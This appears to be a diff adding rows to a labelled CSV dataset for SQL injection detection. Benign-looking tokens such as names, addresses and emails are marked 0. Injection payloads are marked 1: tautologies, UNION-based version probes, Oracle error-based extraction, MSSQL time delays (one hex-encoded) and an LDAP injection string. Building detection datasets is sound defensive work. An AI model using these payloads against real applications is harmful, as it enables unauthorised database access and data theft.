@@ -55,3 +55,78 @@ UPDATE,2016-01-27
 "; exec xp_regread,1",2018-08-16
 "*|,1",2018-08-09
 "@var select @var as var into temp end --,1",2018-08-03
+"illano,0",2008-01-01
+"paracuellos de jarama,0",2008-01-01
+"56876281h,0",2008-01-01
+"marmolejos,0",2008-01-01
+"brenda,0",2008-01-01
+" select * from users where id = 1 or 1#"". union select 'a',version (  )  -- 1,1",2008-01-01
+" select * from users where id = 1 or 1#""; union select null,version (  )  -- 1,1",2008-01-01
+" select * from users where id = 1 or 1#""? or 1 = 1 -- 1,1",2008-01-01
+"""a"""" or 1 = 1--"",1",2008-01-01
+" select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1,1",2008-01-01
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i,1",2008-01-01
+"admin' or ',1",2008-01-01
+" select * from users where id = '1' union select  ( \ ) ,@@VERSION -- 1',1",2008-01-01
+"1'1,1",2008-01-01
+"1 and user_name (  )   =  'dbo',1",2008-01-01
+"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --,1",2008-01-01
+" select * from users where id = 1 or 1#""$ union select 1,version (  )  -- 1,1",2008-01-01
+" select * from users where id = 1 or 1#""{ union select null,version (  )  -- 1,1",2008-01-01
+" select * from users where id = '1' *$ . or 1 = 1 -- 1',1",2008-01-01
+" select * from users where id = 1 +$+. or 1 = 1 -- 1,1",2008-01-01
+" select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1,1",2008-01-01
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i,1",2008-01-01
+" or 1 = 1 or '' = ',1",2008-01-01
+" select * from users where id = 1   or 1 = 1 -- 1,1",2008-01-01
+" or 'text' > 't',1",2008-01-01
+"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055,1",2008-01-01
+" select * from users where id = 1 or ""%["" or 1 = 1 -- 1,1",2008-01-01
+"admin"" --,1",2008-01-01
+"27113,0",2010-02-27
+"7613,0",2010-03-07
+"84q42o,0",2010-03-15
+"fiset,0",2010-03-15
+"glvez matons,0",2010-05-04
+"c/ juan ramon jimenez, 135, 11d,0",2010-03-30
+"condal talero,0",2010-03-07
+"fulmer,0",2010-03-03
+"femke,0",2010-03-16
+"whorf.laporte@sindualidad.fo,0",2010-05-21
+"7016,0",2010-02-17
+"waggenheim@rubirubi.info,0",2010-04-27
+"shdanoff@esposo.com.tj,0",2010-02-16
+"oco,0",2010-02-16
+"jabbari,0",2010-02-20
+"rodis-ryan@colorprint.info,0",2010-03-02
+"lucar planes,0",2010-03-30
+"scheifel2,0",2010-05-27
+"keaton3,0",2010-02-08
+"46177,0",2010-02-25
+"05659,0",2010-04-30
+"0488545604364372,0",2010-04-29
+"arvizu tirapu,0",2010-03-07
+"plaza cinco villas, 103,,0",2010-05-20
+"24249,0",2010-03-09
+"92621448b,0",2010-05-28
+"3621942696943868,0",2010-03-26
+"trebaol@arroyomolinos-madrid.gq,0",2010-05-25
+" select * from users where id = '1' union select !<@,version (  )  -- 1',1",2010-03-04
+"declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...,1",2010-04-16
+"' or 1 = 1 or '' = ',1",2010-05-12
+" select * from users where id = 1 %!<1 or 1 = 1 -- 1,1",2010-02-13
+"declare @q nvarchar  ( 200 )  select @q  =  0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ) ,1",2010-05-21
+"&,1",2010-03-22
+"1\'1,1",2010-05-25
+" select * from users where id = 1 or ""]1"" or 1 = 1 -- 1,1",2010-05-31
+"%2A%28%7C%28objectclass%3D%2A%29%29,1",2010-03-25
+" select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1,1",2010-05-01
+" or 'unusual'  =  'unusual',1",2010-04-09
+"' or 1 in  ( select @@version ) --,1",2010-02-08
+"truncate,1",2010-03-17
+"as,1",2010-03-22
+" or 3 = 3 --,1",2010-02-20
+" select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1,1",2010-05-29
+" select * from users where id = 1 <@$$ union select 1,version (  )  -- 1,1",2010-05-09
+"admin"" )  or  ( ""1"" = ""1,1",2010-02-04
+" select * from users where id = 1 or 1#""@ union select 'a',version (  )  -- 1,1",2010-02-05
